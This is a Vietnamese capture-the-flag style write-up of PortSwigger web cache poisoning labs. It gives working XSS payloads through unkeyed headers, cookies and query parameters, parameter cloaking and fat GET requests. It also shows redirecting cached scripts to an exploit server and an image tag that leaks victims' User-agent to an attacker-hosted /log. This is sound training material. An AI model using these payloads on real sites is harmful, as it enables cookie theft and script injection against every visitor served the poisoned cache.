# Web13

- [Web cache poisoning](#web-cache-poisoning)
    - [Web cache poisoning with an unkeyed header](#web-cache-poisoning-with-an-unkeyed-header)
    - [Web cache poisoning with an unkeyed cookie](#web-cache-poisoning-with-an-unkeyed-cookie)
    - [Web cache poisoning with multiple headers](#web-cache-poisoning-with-multiple-headers)
    - [Targeted web cache poisoning using an unknown header](#targeted-web-cache-poisoning-using-an-unknown-header)
    - [Web cache poisoning via an unkeyed query string](#web-cache-poisoning-via-an-unkeyed-query-string)
    - [Web cache poisoning via an unkeyed query parameter](#web-cache-poisoning-via-an-unkeyed-query-parameter)
    - [Parameter cloaking](#parameter-cloaking)
    - [Web cache poisoning via a fat GET request](#web-cache-poisoning-via-a-fat-get-request)
    - [URL normalization](#url-normalization)
    - [Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria](#web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria)
    - [Combining web cache poisoning vulnerabilities](#combining-web-cache-poisoning-vulnerabilities)

# Web cache poisoning

### Web cache poisoning with an unkeyed header

Nhờ hint, ta biết được web site có hỗ trợ header `X-Forwarded-Host`. Sử dụng header đó ta thấy phần host của các thuộc tính `src` bị thay đổi theo input của ta.

![Untitled](wu_media/Untitled.png)

Ngoài ra website cũng lưu cache trong 30s → nếu ta inject một đoạn code độc vào header `X-Forwarded-Host` thì các user khác khi truy cập vào path `/` trong vòng 30s đều sẽ bị dính mã độc đó

```
X-Forwarded-Host: "> </script> <script> alert(document.cookie) </script>
```

![Untitled](wu_media/Untitled%201.png)

![Untitled](wu_media/Untitled%202.png)

---

### Web cache poisoning with an unkeyed cookie

Có thể thấy nội dung của cookie được reflect lại vào nội dung website. Ngoài ra trang web sẽ được lưu vào cache trong 30s.

![Untitled](wu_media/Untitled%203.png)

Thay đổi cookie, thấy nội dung website cũng được thay đổi theo

![Untitled](wu_media/Untitled%204.png)

Thử thay đổi cookie lần nữa, thấy nội dung website được lấy từ cache → là unkeyed cookie

![Untitled](wu_media/Untitled%205.png)

Gửi cookie với payload như sau để thực hiện lệnh `alert()`

```
"}%3b+alert(1)%3b+{"
```

![Untitled](wu_media/Untitled%206.png)

---

### Web cache poisoning with multiple headers

Bằng việc sử dụng header `X-Forwarded-Scheme` và `X-Forwarded-Host`, ta có thể control phần nội dùng của header `Location` trong response. Ngoài ra header `X-Cache` cũng cho ta thấy response được lấy từ cache.

![Untitled](wu_media/Untitled%207.png)

->ta có thể thực hiện cache poisoning ở path `/resources/js/tracking.js` để khi trang web cần load file `tracking.js`, nó sẽ redirect sang file script của ta

Sử dụng Explotit Server để host file script

![Untitled](wu_media/Untitled%208.png)

Posion cache bằng 2 header:

```
X-Forwarded-Host: exploit-0aba005f04890ba4c0dceecb0138006d.web-security-academy.net/exploit
X-Forwarded-Scheme: http
```

![Untitled](wu_media/Untitled%209.png)

Như vậy mỗi khi website truy cập đến file `/resources/js/tracking.js`, nó sẽ truy cập file `/resources/js/tracking.js` trong cache (là file đã bị ta poisoned)

![Untitled](wu_media/Untitled%2010.png)

---

### Targeted web cache poisoning using an unknown header

Sử dụng Param Miner để guess header, ta thấy có các response có length khác nhau.

![Untitled](wu_media/Untitled%2011.png)

Sử dụng Comparer, ta thấy 2 response khác nhau ở thuộc tính `src` → có header có khả năng thay đổi host trong `src`

![Untitled](wu_media/Untitled%2012.png)

Ngoài ra, đọc output ta sẽ thấy website sử dụng header `X-Host`, test lại thấy giá trị của header này sẽ được reflect lại trên thuộc tính `src`

![Untitled](wu_media/Untitled%2013.png)

![Untitled](wu_media/Untitled%2014.png)

Dựng đổi enpoint trên Exploit server thành `/resources/js/tracking.js` và Body là `alert(document.cookie)`

![Untitled](wu_media/Untitled%2015.png)

Ngoài ra, response còn có header `Vary: User-agent` → User-agent cũng được sử dụng làm cache key. Do đó để target cache poisoning một nhóm đối tượng ta có thể sử dụng User-agent của họ.

![Untitled](wu_media/Untitled%2016.png)

Do user sẽ đọc mọi comment nên ta sẽ gửi comment `<image src=https://exploit-0ab100790453c9c3c0e389da012e00b3.web-security-academy.net/log>` để khi user load, ta sẽ có được thông tin từ user.

![Untitled](wu_media/Untitled%2017.png)

Có được User-agent, copy paste vào request và gửi để response được lưu vào cache, trong vòng 30s những user có User-agent giống vậy khi truy cập trang chủ sẽ truy cập trang web từ cache.

---

### Web cache poisoning via an unkeyed query string

Có thể thấy nội dung query được reflect lại lên response

![Untitled](wu_media/Untitled%2018.png)

Ngoài ra, cache key không dựa trên Query string hay bất cứ header nào hiện có → đa số user sử dụng Chrome khi truy cập đến trang chủ đều sẽ lấy response từ cache

Payload:

```
?a='><script>alert(1)</script>
```

![Untitled](wu_media/Untitled%2019.png)

---

### Web cache poisoning via an unkeyed query parameter

Dùng Param Miner để guess parameter, ta tìm được parameter `utm_content` là unkeyed parameter

![Untitled](wu_media/Untitled%2020.png)

Gửi request với payload:

```
?utm_content='><script>alert(1)</script>
```

![Untitled](wu_media/Untitled%2021.png)

---

### Parameter cloaking

Dùng Param Miner để guess parameter, ta tìm được parameter `utm_content` là unkeyed parameter

![Untitled](wu_media/Untitled%2020.png)

Ngoài ra website còn gọi thêm 1 request nữa đến `/js/geolocate.js` với param `callback`

![Untitled](wu_media/Untitled%2022.png)

Có thể thấy nội dung file js sẽ được thay đổi theo param `callback`

![Untitled](wu_media/Untitled%2023.png)

Ngoài ra ta cũng có thể sử dụng dấu `;` để ngăn cách các param, nếu có param giống nhau thì backend sẽ lấy param cuối.

![Untitled](wu_media/Untitled%2024.png)

Kết hợp các điều trên, ta có hướng cache poisoning như sau: khi user truy cập trang chủ, browser sẽ gửi thêm request đến `/js/geolocate.js?callback=setCountryCookie`. Response này được lưu cache trong 35s, do đó ta có thể poison cache bằng payload

```
 /js/geolocate.js?callback=setCountryCookie&utm_content=a;callback=alert(1)%3bconsole.log
```

![Untitled](wu_media/Untitled%2025.png)

![Untitled](wu_media/Untitled%2026.png)

---

### Web cache poisoning via a fat GET request

Có thể thấy nếu ta gửi một GET request có body, backend sẽ sử dụng cả param từ nội dung body

![Untitled](wu_media/Untitled%2027.png)

Do đó khi ta poison cache của response khi request đến `/js/geolocate.js?callback=setCountryCookie`, các user khi truy cập trang chủ sẽ sử dụng response từ cache đã bị poisoned

![Untitled](wu_media/Untitled%2028.png)

![Untitled](wu_media/Untitled%2029.png)

---

### URL normalization

Có thể thấy nếu ta request một path không tồn tại, tên path sẽ được reflect lại ở response

![Untitled](wu_media/Untitled%2030.png)

Nếu thực hiện XSS trên browser, ta sẽ nhận lại response có URL encoded do browser khi gửi payload sẽ tự động thực hiện URL encode các ký tự đặc biệt trong payload

![Untitled](wu_media/Untitled%2031.png)

Do đó ta cần gửi request bằng Burp

![Untitled](wu_media/Untitled%2032.png)

Copy lại URL rồi gửi cho victim để hoàn thành lab

---

### Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria

Đọc src HTML, ta thấy file `/resources/js/geolocate.js` có hàm `initGeoLocate()`

```json
function initGeoLocate(jsonUrl)
{
    fetch(jsonUrl)
        .then(r => r.json())
        .then(j => {
            let geoLocateContent = document.getElementById('shipping-info');

            let img = document.createElement("img");
            img.setAttribute("src", "/resources/images/localShipping.svg");
            geoLocateContent.appendChild(img)

            let div = document.createElement("div");
            div.innerHTML = 'Free shipping to ' + j.country;
            geoLocateContent.appendChild(div)
        });
}
```

Có thể thấy script sử dụng `innerHTML` để thêm nội dung vào thẻ `div`, trong đó nội dung bao gồm `j.contry` lấy từ file json thông qua param `jsonUrl` → ta cần tìm cách để control được nội dung json và thêm đoạn code thực hiện `alert(document.cookie)`

Tìm đến phần gọi hàm `initGeoLocate()`

![Untitled](wu_media/Untitled%2033.png)

Như vậy hàm lấy value từ `data.host`

![Untitled](wu_media/Untitled%2034.png)

Dùng Param Miner, ta thấy header `X-Forwarded-Host` được sử dụng

![Untitled](wu_media/Untitled%2035.png)

Test thấy giá trị của header được reflex lại trên response ở `data.host`

![Untitled](wu_media/Untitled%2036.png)

→ ta có thể đổi `data.host` để trỏ về host của Exploit Server và dựng một file `/resources/js/geolocate.js`

Gửi request với header `XFH` là host của Exploit server

![Untitled](wu_media/Untitled%2037.png)

Tuy nhiên ta sẽ bị lỗi SOP khi request đến host ngoài

![Untitled](wu_media/Untitled%2038.png)

Do đó ta sẽ cần thêm header `Access-Control-Allow-Origin: *`

![Untitled](wu_media/Untitled%2039.png)

Kết quả

![Untitled](wu_media/Untitled%2040.png)

Cuối cùng ta cần response được lưu và cache. Có thể thấy ta cần có cookie session trong request để thực hiện điều này.

![Untitled](wu_media/Untitled%2041.png)

![Untitled](wu_media/Untitled%2042.png)

→ thực hiện cache poisoning trang chủ và đợi victim truy cập để hoàn thành lab

![Untitled](wu_media/Untitled%2043.png)

![Untitled](wu_media/Untitled%2044.png)

---

### Combining web cache poisoning vulnerabilities

Xem solution